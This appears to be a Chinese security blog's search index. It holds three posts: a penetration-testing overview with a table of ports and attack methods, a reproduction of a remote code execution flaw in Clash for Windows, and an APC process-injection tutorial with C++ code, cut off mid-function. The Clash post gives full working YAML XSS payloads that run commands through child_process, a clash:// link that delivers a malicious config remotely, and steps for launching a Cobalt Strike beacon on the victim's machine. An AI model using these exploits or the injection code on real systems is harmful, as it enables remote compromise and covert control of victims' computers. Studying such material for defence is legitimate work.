<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>攻击路径及基本流程</title>
      <link href="/post/65a45ac1.html"/>
      <url>/post/65a45ac1.html</url>
      
        <content type="html"><![CDATA[<h2 id="攻击路径及基本流程"><a href="#攻击路径及基本流程" class="headerlink" title="攻击路径及基本流程"></a>攻击路径及基本流程</h2><h3 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h3><p>互联网场景下的攻击多种多样，攻击者可以对目标的任意系统的任意端口或服务进行攻击，大致分为以下几种攻击路径：</p><p>1.互联网Web应用系统攻击</p><p>2.互联网旁站攻击</p><p>3.互联网系统与服务攻击</p><p>4.移动App攻击</p><p>5.社会工程学攻击</p><p>6.近源攻击</p><p>7.供应链攻击</p><h3 id="互联网Web应用系统攻击"><a href="#互联网Web应用系统攻击" class="headerlink" title="互联网Web应用系统攻击"></a>互联网Web应用系统攻击</h3><p>Web安全攻击的方式多种多样，下图是OWSA在公开发布的2021年版的《OWSAP Top 10》中介绍的前10大Web安全漏洞。</p><p><img src="https://s2.loli.net/2022/03/09/JVoOM3h65wEv9au.png" alt="image-20220309164102256"></p><p>下面介绍针对Web应用系统的攻击方法。<br>通过了解某公司，存在其web应用服务器，扫描其端口，查看开放的服务。根据开放的端口确定其开放的服务。<br>若是开放80端口，则提供的是网站服务。再根据网站的一些logo信息以及页面的底部有”Powerd by ~~”来确定使用了什么CMS。<br>再通过CMS在互联网上查看是否有相关的漏洞。<br>若存在，接着利用此漏洞进行对网站的攻击，进入网站的后台。</p><p>进入后台要关注以下几点：<br>1.是否存在文件上传点，文件名是否可控<br>2.是否存在备份数据库，数据库名是否可控<br>3.是否存在修改模板，修改内容是否可控<br>4.是否存在配置上传类型等选项<br>5.各种系统配置，如网站名、简介等<br>通过以上方法最终以获得网站的webshelll。</p><h3 id="旁站攻击"><a href="#旁站攻击" class="headerlink" title="旁站攻击"></a>旁站攻击</h3><p>旁站就是指同一服务器中不同站点，旁站攻击就是针对同一服务器上不同站点进行渗透的方法。<br>在攻击过程中目标站点往往比较难以攻破，所以就衍生出了几种攻击方法：<br>1.旁站攻击<br>2.子域名攻击<br>3.C段攻击</p><p>一般的旁站攻击手法分为以下几种：<br>1.IP反查<br>2.端口扫描<br>3.二级站点</p><p>其中IP反查是最常见的手法，针对IP反查的攻击手法一般有如下步骤：<br>1.获得站点的真实IP<br>2.通过查询接口根据ip反查绑定的域名<br>3.对旁站进行渗透并Getshell<br>4.通过旁站的Shell进行提权，获取服务器权限</p><h3 id="互联网系统与服务攻击"><a href="#互联网系统与服务攻击" class="headerlink" title="互联网系统与服务攻击"></a>互联网系统与服务攻击</h3><p>服务器运行的不同服务对应着不同的端口，对端口渗透就是对服务的渗透，在对端口渗透前首先判断目标开启了哪些端口，这些端口对应的是什么服务，在判断这些服务是否存在漏洞最后进行渗透。</p><table><thead><tr><th>端口号</th><th>端口服务/协议的简要说明</th><th>常见攻击手法</th></tr></thead><tbody><tr><td>20、21</td><td>FTP(默认的数据和指令传输端口，进行文件传输)</td><td>匿名访问、留后门、暴力破解、嗅探、提权等</td></tr><tr><td>22</td><td>SSH(Linux系统远程登陆、文件传输、SSL加密等)</td><td>弱口令暴力破解获得Linux系统远程登录权限</td></tr><tr><td>23</td><td>Telent(明文传输)</td><td>弱口令暴力破解、明文嗅探</td></tr><tr><td>25</td><td>SMTP(简单邮件传输协议)</td><td>枚举邮箱用户、邮件伪造</td></tr><tr><td>53</td><td>DNS((域名解析)</td><td>DNS劫持、域传送漏洞</td></tr><tr><td>69</td><td>TFTP(简单文件传输协议)</td><td>文件下载</td></tr><tr><td>80、443、8080等</td><td>Web(常用Web服务端口)</td><td>Web服务</td></tr><tr><td>110</td><td>POP邮局协议</td><td>弱口令破解、明文嗅探</td></tr><tr><td>137、139、445</td><td>Smba(Windows 系统和Linux系统间文件共享)</td><td>MS08-067、MS17-010、弱口令暴力破解等</td></tr><tr><td>143</td><td>IMAP(可明文可密文)</td><td>暴力破解</td></tr><tr><td>161</td><td>SNMP(明文)</td><td>暴力破解、弱密码</td></tr><tr><td>389</td><td>LDAP(轻型目录访问协议)</td><td>Ldap注入、匿名访问、弱口令</td></tr><tr><td>512、513、514</td><td>Linux rexec</td><td>暴力破解、rlogin登录</td></tr><tr><td>873</td><td>rsync备份服务</td><td>匿名访问、上传</td></tr><tr><td>1194</td><td>Open VPN</td><td>VPN账号暴力破解</td></tr><tr><td>1352</td><td>Lotus Domino 邮件服务</td><td>弱口令、信息泄露、暴力破解</td></tr><tr><td>1433</td><td>MSSQL 数据库</td><td>注入、弱口令、暴力破解</td></tr><tr><td>1500</td><td>ISPManager 主机控制面板</td><td>弱口令</td></tr><tr><td>1521</td><td>Oracle数据库</td><td>暴力破解、注入</td></tr><tr><td>1052、111、2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>1723</td><td>PPTP</td><td>暴力破解</td></tr><tr><td>2082、2083</td><td>cPanel 主机管理面板登录</td><td>弱口令</td></tr><tr><td>2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>2601、2604</td><td>Zebra 路由</td><td>弱口令</td></tr><tr><td>3128</td><td>Squid 代理服务</td><td>弱口令</td></tr><tr><td>3312、3311</td><td>Kangke主机管理登录</td><td>弱口令</td></tr><tr><td>3306</td><td>Mysql数据库</td><td>注入、暴力破解</td></tr><tr><td>3389</td><td>Windows RDP远程桌面</td><td>shift后门、暴力破解、ms12-020</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>弱口令</td></tr><tr><td>4899</td><td>Radmin远程桌面管理工具</td><td>可获取其保存的密码</td></tr><tr><td>5000</td><td>Sybase/DB2数据库</td><td>暴力破解、弱口令</td></tr><tr><td>5432</td><td>PostgreSQL数据库</td><td>暴力破解、弱口令</td></tr><tr><td>5632</td><td>PcAnywhere远程控制软件</td><td>代码执行</td></tr><tr><td>5900、5901、5902</td><td>VNC远程桌面管理工具</td><td>暴力破解</td></tr><tr><td>5984</td><td>CouchDB</td><td>未授权</td></tr><tr><td>6379</td><td>Redis存储系统</td><td>未授权访问、暴力破解</td></tr><tr><td>7001、7002</td><td>WebLogic控制台</td><td>Java反序列化、弱口令</td></tr><tr><td>7778</td><td>Kloxo</td><td>面板登录</td></tr><tr><td>8000</td><td>Ajenti主机控制面板</td><td>弱口令</td></tr><tr><td>8443</td><td>Plesk主机控制面板</td><td>弱口令</td></tr><tr><td>8096</td><td>Zabbix</td><td>远程执行、SQL注入</td></tr><tr><td>8080~8089</td><td>Jenkins、Jboss</td><td>反序列化、弱口令</td></tr><tr><td>9080、9081、9090</td><td>WebSphere控制台</td><td>Java反序列化、弱口令</td></tr><tr><td>9200、9300</td><td>Elasticsearch</td><td>远程执行</td></tr><tr><td>10000</td><td>Webmin Linux系统管理工具</td><td>弱口令</td></tr><tr><td>11211</td><td>Memcached高速缓存系统</td><td>未授权访问</td></tr><tr><td>27017、27018</td><td>MongoDB</td><td>暴力破解、未授权访问</td></tr><tr><td>3690</td><td>SVN 服务</td><td>SVN泄露、未授权访问</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>远程执行</td></tr><tr><td>50070、50030</td><td>Hadoop</td><td>未授权访问</td></tr></tbody></table><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>攻击流程一般分为四个阶段：信息收集阶段、漏洞分析阶段、攻击阶段、后渗透阶段。</p><p>在明确攻击目标后，要对目标进行信息收集，收集的内容包括网络架构、IP资源、域名信息、服务器信息、人力资源信息等多方面。攻击者通过对IP资源、域名信息、服务器信息收集后就可以分析出目标的网络架构及IT资产信息；通过对目标人力资源的信息收集可以判断目标企业的组织结构、关键人员信息、供应商、合作伙伴的相关信息。</p><p>实际攻击中，攻击者收集到相关信息后就需要对所有的信息进行综合分析，判断哪个地方是薄弱点，将薄弱点作为最优先的攻击路径，这样才是快速有效的攻击。</p><p>确定攻击路径后，下一步就是实施攻击，这个过程称为“打点”，就是通过攻击获取目标的一个有效权限。攻击者可能会通过nday、1day、0day漏洞进行攻击，还有可能通过各种方式来绕过目标的防御机制，如防火墙、WAF等，还要注意攻击的隐蔽性，减少不必要的扫描的测试行为。</p><p>打点成功、获得应用服务器的权限后，西医不就是对内网进行信息收集 ， 横向渗透获取最终目标的数据及权限，这个阶段称为后渗透阶段。</p><p>后渗透阶段需要做的事情很多，要对据点进行长效性控制，还需要进行提权和后门植入，通过植入隐蔽性后门程序，达到长效控制的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>crash_for_windows_pkg远程代码执行漏洞</title>
      <link href="/post/ced7057b.html"/>
      <url>/post/ced7057b.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><a href="https://github.com/Fndroid/clash_for_windows_pkg">crash_for_windows_pkg</a>由 Electron 提供支持。如果 XSS 负载以代理的名义，我们可以远程执行受害者计算机上的任何 JavaScript 代码。</p><p><img src="https://s2.loli.net/2022/02/26/pgFT6s7GEyRIuYv.png" alt="image-20220226224647047"></p><h2 id="受影响的冲突版本-for-windows-pkg"><a href="#受影响的冲突版本-for-windows-pkg" class="headerlink" title="受影响的冲突版本_for_windows_pkg"></a>受影响的冲突版本_for_windows_pkg</h2><p>版本：&lt; 0.19.9</p><p>平台：windows,mac</p><p>操作系统细节：Windows 10</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.新建一个yaml配置文件，内容具体如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;17938&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">abc</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br></pre></td></tr></table></figure><p>2.打开clash，在Pprofiles中导入刚刚创建的配置文件</p><p><img src="https://s2.loli.net/2022/02/26/2jmfcUbQ8uhKDyV.png" alt="image-20220226225510800"></p><p>3.在proxies中点击图片链接即可触发。</p><p><img src="https://s2.loli.net/2022/02/26/tWvbKupjkJRG48d.png" alt="image-20220226225616304"></p><p><img src="https://s2.loli.net/2022/02/26/lwNjLKnD9We4M7t.png" alt="image-20220226225742259"></p><h2 id="mac脚本"><a href="#mac脚本" class="headerlink" title="mac脚本"></a>mac脚本</h2><p>在mac中只是部分代码不同</p><p>代码如下:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;17938&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">abc</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);`););`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line"></span><br><span class="line">   <span class="bullet">-</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);`);&gt;</span></span><br></pre></td></tr></table></figure><h2 id="另一种利用方式"><a href="#另一种利用方式" class="headerlink" title="另一种利用方式"></a>另一种利用方式</h2><p>将恶意配置文件放到互联网上并用于<code>clash://</code>安装它，clash_for_windows_pkg 将自动下载并切换到它。</p><p>如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clash://install-config?url=http%3A%2F%2F1.1.1.1%3A8888%2F1.txt&amp;name=RCE</span><br></pre></td></tr></table></figure><h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>在CS上生成监听，主要设置端口时不要与上面代码中的端口出现重复，否则会报错。</p><p><img src="https://s2.loli.net/2022/02/26/UQ84A62IPCZlHE5.png" alt="image-20220226230703072"></p><p>接着生成可执行文件</p><p><img src="https://s2.loli.net/2022/02/26/KX2Ct7wT98rAZEi.png" alt="image-20220226230737219"></p><p>将生成的beacon.exe文件放置在目标机C盘中，接着修改配置文件中的路径：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;c:\\becaon.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;17938&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">abc</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;c:\\becaon.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;c:\\becaon.exe&quot;);`);&gt;</span></span><br></pre></td></tr></table></figure><p>接着加载配置文件，最后点击proxies中点击图片链接。返回CS，可以看见已经成功上线CS。</p><p><img src="https://s2.loli.net/2022/02/26/brA629mxZgN3Q1V.png" alt="image-20220226231223319"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进程注入系列一之APC注入</title>
      <link href="/post/41f2e8ee.html"/>
      <url>/post/41f2e8ee.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是APC"><a href="#什么是APC" class="headerlink" title="什么是APC"></a>什么是APC</h2><p>APC 是一个简称，全称为Asynchronous Procedure Call，叫异步过程调用，是指函数在特定线程中被异步执行，在操作系统中，APC是一种并发机制。</p><p>MSDN解释为：</p><p><img src="https://s2.loli.net/2022/02/25/YXqzIHotumjPyZT.png" alt="img"></p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>QueueUserApc</code>：函数作用,添加制定的异步函数调用(回调函数)到执行的线程的APC队列中</p><p><code>APCproc</code>：函数作用: 回调函数的写法. </p><h3 id="核心函数"><a href="#核心函数" class="headerlink" title="核心函数"></a>核心函数</h3><p><strong>QueueUserAPC</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PAPCFUNCpfnAPC, <span class="comment">// APC function</span></span></span></span><br><span class="line"><span class="params"><span class="function">HANDLEhThread, <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">ULONG_PTRdwData <span class="comment">// APC function parameter</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数1表示执行函数的地址，当开始执行该APC的时候，程序会跳转到该函数地址处来执行。</p><p>参数2表示插入APC的线程句柄，要求线程句柄必须包含<code>THREAD_SET_CONTEXT</code> 访问权限。</p><p>参数3表示传递给执行函数的参数，与远线程注入类似，如果<code>QueueUserAPC</code>  的第一个参数为<code>LoadLibraryA</code>，第三个参数设置的是dll路径即可完成dll注入。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>往线程APC队列添加APC，系统会产生一个软中断。在线程下一次被调度的时候，就会执行APC函数，APC有两种形式，由系统产生的APC称为内核模式APC，由应用程序产生的APC被称为用户模式APC</p><p>介绍一下应用程序的APC</p><p>APC是往线程中插入一个回调函数,但是用的APC调用这个回调函数是有条件的.在Msdn的写法如下</p><p><img src="https://s2.loli.net/2022/02/25/S9QRFLpsX4Ow1Gy.png" alt="img"></p><p>上面说到要要使用<code>SleepEx</code>,<code>signalObjectAndWait</code>…..等等这些函数才会触发。</p><p>这就有了APC注入的条件：</p><p>1.必须是多线程环境下</p><p>2.注入的程序必须会调用上面的那些同步对象.</p><h3 id="注入方法原理"><a href="#注入方法原理" class="headerlink" title="注入方法原理"></a>注入方法原理</h3><p>1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断</p><p>2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数</p><p>3.我们利用QueueUserApc,往这个队列中插入一个回调</p><p>4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>1.利用快照枚举所有的线程</p><p>2.写入远程内存,写入的是Dll的路径</p><p>3.插入我们的DLL即可</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>编写一个根据进程名获取pid的函数，然后根据PID获取所有的线程ID，这里我就将两个函数集合在一起，通过自己输入PID来获取指定进程的线程并写入数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//列出指定进程的所有线程</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetProcessThreadList</span><span class="params">(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 申请空间</span></span><br><span class="line">    DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line">    DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;</span><br><span class="line">    LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">    pThreadIdList = (LPDWORD)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(pThreadIdList, dwThreadIdListMaxCount * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line"></span><br><span class="line">    THREADENTRY32 th32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拍摄快照</span></span><br><span class="line">    hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, th32ProcessID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构的大小</span></span><br><span class="line">    th32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有THREADENTRY32结构, 按顺序填入数组</span></span><br><span class="line"></span><br><span class="line">    BOOL bRet = <span class="built_in">Thread32First</span>(hThreadSnap, &amp;th32);</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (th32.th32OwnerProcessID == th32ProcessID)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = <span class="built_in">Thread32Next</span>(hThreadSnap, &amp;th32);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *pThreadIdListLength = dwThreadIdListLength;</span><br><span class="line">    *ppThreadIdList = pThreadIdList;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是apc注入的主函数，首先使用<code>VirtualAllocEx</code>远程申请内存</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">APCInject</span><span class="params">(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line"></span><br><span class="line">PVOID lpAddr = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T page_size = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">lpAddr = ::<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">nullptr</span>, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span 